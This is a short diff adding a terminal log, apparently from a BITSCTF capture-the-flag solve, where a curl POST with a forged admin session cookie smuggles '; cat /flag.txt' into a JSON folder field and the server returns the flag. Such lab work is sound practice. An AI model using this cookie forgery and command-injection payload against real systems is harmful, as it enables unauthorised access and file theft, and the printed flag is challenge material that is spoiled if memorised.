@@ -1,0 +1,17 @@
+
+┌──(santey22㉿santey22)-[~]
+└─$ curl -i -X POST "http://chals.bitskrieg.in:38715/admin/list" \
+  -H "Content-Type: application/json" \
+  -H "Cookie: session=admin" \
+  --data-raw '{"folder":{"raw":"; cat /flag.txt"}}'
+HTTP/1.1 200 OK
+Content-Type: application/json
+Date: Sat, 21 Feb 2026 18:00:32 GMT
+Content-Length: 119
+
+{"files":["notes","public","src","node_modules","bun.lock","package.json","BITSCTF{7e1a5940fcc0e88a1ec6d78f7d16f3bd}"]}
+┌──(santey22㉿santey22)-[~]
+└─$
+
+
+
